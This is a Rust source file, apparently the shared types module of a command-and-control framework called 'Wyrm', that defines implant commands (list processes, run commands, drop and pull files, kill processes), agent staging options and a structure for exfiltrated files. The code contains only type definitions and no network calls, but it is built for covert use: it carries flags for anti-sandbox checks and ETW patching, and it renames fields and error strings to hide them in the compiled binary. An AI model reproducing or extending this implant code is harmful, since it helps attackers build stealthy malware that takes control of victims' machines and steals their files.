use core::panic;
use serde::{Deserialize, Serialize};
use std::{
    fmt::{Debug, Display},
    iter::Enumerate,
    mem::transmute,
    path::PathBuf,
};

/// Commands supported by the implant and C2.
///
/// To convert an integer `u32` to a [`Command`], use [`Command::from_u32`].
///
/// # Safety
/// We are using 'C' style enums to avoid needing serde to ser/deser types through the network.
/// When interpreting a command integer, it **MUST** in all cases, be interpreted by [std::mem::transmute]
/// as a `u32`, otherwise you risk UB.
#[repr(u32)]
#[derive(Serialize, Deserialize, Copy, Clone, PartialEq, Eq)]
pub enum Command {
    Sleep = 1u32,
    Ps,
    GetUsername,
    Pillage,
    UpdateSleepTime,
    Pwd,
    // Used when the beacon first boots, sending self metadata to the c2
    AgentsFirstSessionBeacon,
    Cd,
    KillAgent,
    KillProcess,
    Ls,
    Run,
    /// Uploads a file to the target machine
    Drop,
    /// Copies a file
    Copy,
    /// Moves a file
    Move,
    /// Pulls a file from the target machine, downloading to the C2
    Pull,
    // This should be totally unreachable; but keeping to make sure we don't get any weird UB, and
    // make sure it is itemised last in the enum
    Undefined,
}

#[derive(Serialize, Deserialize, Clone, PartialEq, Eq)]
pub struct FileDropMetadata {
    pub internal_name: String,
    pub download_name: String,
    pub download_uri: Option<String>,
}

impl Debug for FileDropMetadata {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("a")
            .field("b", &self.internal_name)
            .field("c", &self.download_name)
            .finish()
    }
}

impl Into<String> for FileDropMetadata {
    fn into(self) -> String {
        match serde_json::to_string(&self) {
            Ok(s) => s,
            // Note the error case here will cause side effect errors downstream meaning the
            // command will fail. However, this is rust, and those can at least be dealt with
            // safely.
            // Alternatively we can panic, but, I'm not sure that is the best approach, I'd rather
            // just fail the individual operation than panic.
            Err(_) => "".into(),
        }
    }
}

impl TryFrom<&str> for FileDropMetadata {
    type Error = &'static str;

    fn try_from(value: &str) -> Result<Self, Self::Error> {
        serde_json::from_str(value).map_err(|_| "")
    }
}

impl Command {
    pub fn from_u32(id: u32) -> Self {
        // SAFETY: We have type safe signature ensuring that the input type is a u32 for the conversion
        unsafe { transmute(id) }
    }

    pub fn to_u16_tuple_le(&self) -> (u16, u16) {
        let low_word: u16 = (*self as u32 & 0xFFFF) as u16;
        let high_word: u16 = (*self as u32 >> 16) as u16;

        (low_word, high_word)
    }

    /// Determines whether the task is auto-completable for the database
    pub fn is_autocomplete(&self) -> bool {
        matches!(
            self,
            Command::Sleep | Command::UpdateSleepTime | Command::KillAgent
        )
    }
}

#[cfg(debug_assertions)]
impl Display for Command {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let choice = match self {
            Command::Sleep => "Sleep",
            Command::Ps => "ListProcesses",
            Command::Undefined => "Undefined -> You received an invalid code.",
            Command::GetUsername => "GetUsername",
            Command::Pillage => "ListUsersDirs",
            Command::UpdateSleepTime => "UpdateSleepTime",
            Command::Pwd => "Pwd",
            Command::AgentsFirstSessionBeacon => "AgentsFirstSessionBeacon",
            Command::Cd => "Cd",
            Command::KillAgent => "KillAgent",
            Command::Ls => "Ls",
            Command::Run => "Run",
            Command::KillProcess => "KillProcess",
            Command::Drop => "Drop",
            Command::Copy => "Copy",
            Command::Move => "Move",
            Command::Pull => "Pull",
        };

        write!(f, "{choice}")
    }
}

/// The inner type for the [`AdminCommand::Copy`] and [`AdminCommand::Move`], represented as an tuple with
/// the format (from, to).
pub type FileCopyInner = (String, String);

/// Represents inner data for the [`AdminCommand::BuildAllBins`], as a tuple for:
/// (`profile_disk_name`, `save path`, `listener_profile`, `implant_profile`).
///
/// For `listener_profile` & `implant_profile`, a value of `None` will resolve to matching on `default`.
pub type BuildAllBins = (String, String, Option<String>, Option<String>);

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum AdminCommand {
    Sleep(i64),
    ListAgents,
    ListProcesses,
    GetUsername,
    ListUsersDirs,
    PullNotifications,
    Pwd,
    KillAgent,
    KillProcessById(String),
    Cd(String),
    Ls,
    ShowServerTime,
    StageFileOnC2(FileUploadStagingFromClient),
    Login,
    ListStagedResources,
    DeleteStagedResource(String),
    Run(String),
    RemoveAgentFromList,
    Drop(FileDropMetadata),
    Copy(FileCopyInner),
    Move(FileCopyInner),
    /// Pulls a file from the target machine, downloading to the C2
    Pull(String),
    BuildAllBins(BuildAllBins),
    Undefined,
}

pub struct Task {
    pub id: i32,
    pub command: Command,
    pub metadata: Option<String>,
}

impl Task {
    pub fn from(id: i32, command: Command, metadata: Option<String>) -> Self {
        Self {
            id,
            command,
            metadata,
        }
    }
}

impl Display for Task {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        #[cfg(debug_assertions)]
        return write!(
            f,
            "id: {}, command: {}, metadata: {:?}",
            self.id, self.command, self.metadata
        );

        #[cfg(not(debug_assertions))]
        return write!(f, "");
    }
}

#[derive(Serialize, Deserialize, Clone, Default)]
pub struct FirstRunData {
    /// `a` is alias for `cwd`
    pub a: PathBuf,
    /// `b` is alias for `pid`
    pub b: u32,
    /// `c` is alias for `process_name`
    pub c: String,
    /// `d` is alias for `agent_name_as_named_by_operator`
    ///
    /// The agent name given to it by the operator during creation, think of this as a
    /// 'family' name.
    pub d: String,
    /// `e` is an alias for teh `Sleep time` of the agent in seconds
    pub e: u64,
}

impl Debug for FirstRunData {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("9")
            .field("a", &self.a)
            .field("b", &self.b)
            .field("c", &self.c)
            .field("d", &self.d)
            .field("e", &self.e)
            .finish()
    }
}

/// Check whether a list of tasks contains the `KillAgent` [`Command`].
///
/// # Returns
/// - `true`: If [`Command::KillAgent`] is present
/// - `false`: If it is not present.
pub fn tasks_contains_kill_agent<T>(tasks: &T) -> bool
where
    for<'a> &'a T: IntoIterator<Item = &'a Task>,
{
    tasks.into_iter().any(|t| t.command == Command::KillAgent)
}

#[derive(Serialize, Deserialize, Clone)]
pub enum WyrmResult<T: Serialize> {
    Ok(T),
    Err(String),
}

impl<T: Serialize> Debug for WyrmResult<T> {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Ok(_) => f.debug_tuple("Ok").finish(),
            Self::Err(e) => f.debug_tuple("Err").field(e).finish(),
        }
    }
}

impl<T: Serialize> Default for WyrmResult<T> {
    fn default() -> Self {
        Self::Err("abcdefghijklmnop".into())
    }
}

impl<T: Serialize> WyrmResult<T> {
    pub fn unwrap(self) -> T {
        match self {
            WyrmResult::Ok(x) => x,
            WyrmResult::Err(_) => panic!(),
        }
    }

    pub fn is_err(&self) -> bool {
        match self {
            WyrmResult::Ok(_) => false,
            WyrmResult::Err(e) => {
                // As the default sets the message to `""` (opsec to prevent strings in binary)
                // we check whether the error contained is the default initialiser
                e != "abcdefghijklmnop"
            }
        }
    }

    pub fn is_empty(&self) -> bool {
        if let Self::Err(e) = self
            && e == "abcdefghijklmnop"
        {
            return true;
        }

        false
    }
}

/// Configuration of a new agent that the C2 will create; the agent will then be staged at `staging_endpoint` on the
/// server.
#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct NewAgentStaging {
    pub implant_name: String,
    pub default_sleep_time: i64,
    pub c2_address: String,
    pub c2_endpoints: Vec<String>,
    pub staging_endpoint: String,
    pub pe_name: String,
    pub port: u16,
    /// A token which validates the agent with the C2. This will prevent attacks whereby an adversary enters an WWW-Authenticate header,
    /// as this would allow them to connect to the C2 as an 'agent'. Their attack would likely be very limited, but it would be possible
    /// for them to POST to the database, etc.
    ///
    /// This token will also help reduce a little server load / ability to be DOS'ed, as the token can be used for authorisation before the
    /// server actually processes the request (via middleware).
    pub agent_security_token: String,
    pub antisandbox_trig: bool,
    pub antisandbox_ram: bool,
    pub stage_type: StageType,
    pub build_debug: bool,
    pub useragent: String,
    pub patch_etw: bool,
    pub jitter: Option<u64>,
}

#[derive(Serialize, Deserialize, Copy, Clone, Debug, PartialEq)]
pub enum StageType {
    Dll,
    Exe,
    All,
}

impl Display for StageType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            StageType::Dll => write!(f, "dll"),
            StageType::Exe => write!(f, "exe"),
            StageType::All => write!(f, "all"),
        }
    }
}

/// Data which relates to a file upload to be staged on the server.
#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct FileUploadStagingFromClient {
    pub download_name: String,
    pub api_endpoint: String,
    pub file_data: Vec<u8>,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct PowershellOutput {
    pub stdout: Option<String>,
    pub stderr: Option<String>,
}

#[derive(Serialize, Deserialize)]
pub struct ExfiltratedFile {
    pub hostname: String,
    pub file_path: String,
    pub file_data: Vec<u8>,
}

impl ExfiltratedFile {
    pub fn new(hostname: String, file_path: String, file_data: Vec<u8>) -> Self {
        Self {
            hostname,
            file_path,
            file_data,
        }
    }
}
